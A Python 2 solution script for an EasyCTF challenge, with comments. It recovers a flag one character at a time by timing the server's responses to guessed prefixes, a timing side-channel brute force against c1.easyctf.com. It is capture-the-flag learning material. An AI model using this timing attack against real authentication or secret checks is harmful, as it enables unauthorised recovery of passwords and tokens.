#!/usr/bin/python
import socket
import time
import re

def netcat(hostname, port):
 # Maximum duration (total)
 max_duration=0
 # The first part of the flag (to skip waiting for finding this part of the flag)
 flag="easyctf{"
 char_found=''
 # The possible characters that we can find in a flag
 T=list("abcdefghijklmnopqrstuvwxyz_-0123456789{}")
 # Initiate the socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Starting the connection
 s.connect((hostname, port))
 # Receiving the data : "enter the flag:"
 data = s.recv(10240)
 # Sending the flag to get the initial time of waiting
 print "Sending",flag
 s.send(flag+"\n")
 # Getting the current time before receiving the answser
 n1=time.time()
 # receiving the answer
 data = s.recv(10240)
 # Getting the current time after receiving the answer
 n2=time.time()
 # We should not forget to close the connection
 s.close()
 # Computing the duration of the operation
 max_duration=round(n2-n1,1)
 print "Initial duration",max_duration
 # Be carefull, you have to assist the script while running it
 # I'm too lazy to write something beautiful than an infinite loop especially in a CTF :p
 # So after guessing this part "easyctf{" and then this part "}", you have to stop the script (Ctrl+C)
 while 1:
  # For each supported character
  for i in T:
    # We repeat the previous operation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    data = s.recv(10240)
    print "Sending",flag+str(i)
    s.send(flag+str(i)+"\n")
    n1=time.time()
    data = s.recv(10240)
    n2=time.time()
    duration=round(n2-n1,1)
    # Until getting the new greatter duration
    if duration>max_duration:
      # We save the position of the character
      char_found=str(i)
      # We compute the additionnal waiting time added when we send
      #  this character with the previous found characters
      # This help us to accelerate the operation of finding the character
      #  that might be the real character, part of the flag
      tmp=duration-max_duration
      #We update the max duration (total)
      max_duration=duration
      # If this character triggered a waiting time > 0.2 (in my server I have a high speed internet)
      if tmp>0.2:
        #So this is character is part of the flag. Then, we break the loop of finding the (i)th character of the flag
        break
    print "Received:", repr(data),"in",duration,"seconds"
    # We should not forget to close the connection
    s.close()
  # We build the flag character by character
  flag=flag+char_found
  # We print the actual flag
  print "Flag :",flag,"(duration=",max_duration,")"

netcat("c1.easyctf.com", 12482)
